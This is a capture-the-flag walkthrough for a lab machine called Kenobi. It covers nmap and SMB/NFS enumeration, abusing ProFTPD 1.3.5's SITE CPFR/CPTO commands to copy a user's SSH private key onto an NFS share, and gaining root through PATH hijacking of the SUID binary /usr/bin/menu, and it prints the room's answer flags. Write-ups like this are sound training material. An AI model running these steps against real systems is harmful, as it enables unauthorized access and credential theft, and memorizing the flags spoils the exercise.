# Kenobi

Initial scan with nmap:

```
# Nmap 7.80 scan initiated Wed Mar 31 16:28:49 2021 as: nmap -sC -sV -vv -oN nmap_standard 10.10.240.32
Nmap scan report for 10.10.240.32
Host is up, received syn-ack (0.036s latency).
Scanned at 2021-03-31 16:28:49 BST for 14s
Not shown: 993 closed ports
Reason: 993 conn-refused
PORT     STATE SERVICE     REASON  VERSION
21/tcp   open  ftp         syn-ack ProFTPD 1.3.5
22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8m00IxH/X5gfu6Cryqi5Ti2TKUSpqgmhreJsfLL8uBJrGAKQApxZ0lq2rKplqVMs+xwlGTuHNZBVeURqvOe9MmkMUOh4ZIXZJ9KNaBoJb27fXIvsS6sgPxSUuaeoWxutGwHHCDUbtqHuMAoSE2Nwl8G+VPc2DbbtSXcpu5c14HUzktDmsnfJo/5TFiRuYR0uqH8oDl6Zy3JSnbYe/QY+AfTpr1q7BDV85b6xP97/1WUTCw54CKUTV25Yc5h615EwQOMPwox94+48JVmgE00T4ARC3l6YWibqY6a5E8BU+fksse35fFCwJhJEk6xplDkeauKklmVqeMysMWdiAQtDj
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBpJvoJrIaQeGsbHE9vuz4iUyrUahyfHhN7wq9z3uce9F+Cdeme1O+vIfBkmjQJKWZ3vmezLSebtW3VRxKKH3n8=
|   256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGB22m99Wlybun7o/h9e6Ea/9kHMT0Dz2GqSodFqIWDi
80/tcp   open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      39903/tcp   mountd
|   100005  1,2,3      41553/udp6  mountd
|   100005  1,2,3      43975/tcp6  mountd
|   100005  1,2,3      52726/udp   mountd
|   100021  1,3,4      34139/tcp   nlockmgr
|   100021  1,3,4      37971/tcp6  nlockmgr
|   100021  1,3,4      38231/udp6  nlockmgr
|   100021  1,3,4      56631/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     syn-ack 2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KENOBI<00>           Flags: <unique><active>
|   KENOBI<03>           Flags: <unique><active>
|   KENOBI<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 13508/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 26686/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 21503/udp): CLEAN (Failed to receive data)
|   Check 4 (port 35143/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2021-03-31T10:29:02-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-31T15:29:01
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 31 16:29:03 2021 -- 1 IP address (1 host up) scanned in 14.32 seconds
```

**Questions**

    1. Scan the machine with nmap, how many ports are open?

7

## Enumerating Samba For Shares

In order to do this I used enum4linux, a tool specifically designed for this job. I also used the command suggested in this room which uses nmaps scripting engine `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.240.32`

**Questions**

    1. Using the nmap command above, how many shares have been found?

3

    2. Once you're connected, list the files on the share. What is the file can you see?

`log.txt`

    3. What port is FTP running on?

21

Enumerating the rpcbind on port 111 with nmap `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.240.32`

    4. What mount can we see?

`/var`

## Gain Initial Access With ProFtpd

**Questions**

The version of ProFtpd can be found by connecting to the machine on the FTP port.

    1. What is the version?

1.3.5

Use Searchsploit to search for exploits for this version

    2. How many exploits are there for the ProFTPd running?

3

Kenobis private ssh key that we saw be generated in `log.txt` can be copied off the system by connection to the proftpd server with `nc 10.10.240.32`

`SITE CPFR /home/kenobi/.ssh/id_rsa`

`SITE CPTO /var/tmp/id_rsa`

This location can be mounted to our machine with

`sudo mkdir /mnt/kenobiNFS`

`mount 10.10.240.32:/var /mnt/kenobiNFS`

`ls -la /mnt/kenobiNFS`

The id_rsa can be copied to our machine with `cp /mnt/kenobiNFS/tmp/id_rsa .`

We can now ssh into the system as kenobi with `ssh -i id_rsa kenobi@10.10.240.32`

    3. What is Kenobi's user flag (/home/kenobi/user.txt)?

d0b0f3f53b6caa532a83915e19224899

## Privilege Escalation with Path Variable Manipulation

So the description of this task doesn't entirely follow my methodology. I immediately copied linPEAS over and ran that in order to establish a baseline. This showed a dodgy looking PATH `New path exported: /home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin` along with finding the SUID executable that was originally intended for this exercise.

```sh
-rwsr-xr-x 1 root   root       8.7K Sep  4  2019 /usr/bin/menu
  --- It looks like /usr/bin/menu is executing curl and you can impersonate it (strings line: curl -I localhost) (https://tinyurl.com/suidpath)
  --- It looks like /usr/bin/menu is executing ifconfig and you can impersonate it (strings line: ifconfig) (https://tinyurl.com/suidpath)
  --- It looks like /usr/bin/menu is executing uname and you can impersonate it (strings line: uname -r) (https://tinyurl.com/suidpath)
```

After establishing what this `/usr/bin/menu` file was doing I began exploiting.
First I created a directory called `bin` in Kenobi's home directory. Next, after changing into that directory, I ran the command `echo /bin/bash > curl`. Next I simply used `chmod 777 curl` to ensure that it had enough permissions. Now running `/usr/bin/menu` and selecting option 1, ran my binary instead which spawned a root bash shell.

**Questions**

    1. What file looks particularly out of the ordinary? 

`/usr/bin/menu`

    2. Run the binary, how many options appear?

3

    3. What is the root flag (/root/root.txt)?

177b3cd8562289f37382721c28381f02